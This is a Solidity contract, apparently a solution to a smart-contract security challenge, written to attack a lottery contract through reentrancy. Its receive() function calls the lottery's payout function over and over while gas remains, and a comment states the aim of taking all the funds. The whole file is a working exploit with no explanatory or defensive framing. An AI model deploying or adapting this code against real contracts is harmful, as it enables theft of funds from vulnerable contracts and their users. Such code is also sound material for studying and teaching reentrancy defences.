// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.0;
import "hardhat/console.sol";

interface ILottery {
    function makeAGuess(address _team, uint256 _guess) external returns (bool);

    function payoutWinningTeam(address _team) external returns (bool);
}

contract ReenterLottery {
    ILottery lottery;
    address team;

    constructor(address _lotteryAddress) public payable {
        require(msg.value == 1_000_000_000, "Invest 1 gwei to sign up");
        lottery = ILottery(_lotteryAddress);
    }

    // Call the exposed to reentrancy function
    function payoutWinningTeam(address _team) external returns (bool) {
        team = _team;
        lottery.payoutWinningTeam(_team);
    }

    // re-enter from here until you take all the funds.
    receive() external payable {
        while (gasleft() > 20_000 && address(lottery).balance > 2_000_000_000) {
            lottery.payoutWinningTeam(payable(team));
        }
    }

    function changeLottery(address _newLottery) external {
        lottery = ILottery(_newLottery);
    }

    function makeAGuess(address _team, uint256 _guess) external returns (bool) {
        lottery.makeAGuess(_team, _guess);
    }

    function getPaid() external payable {}
}
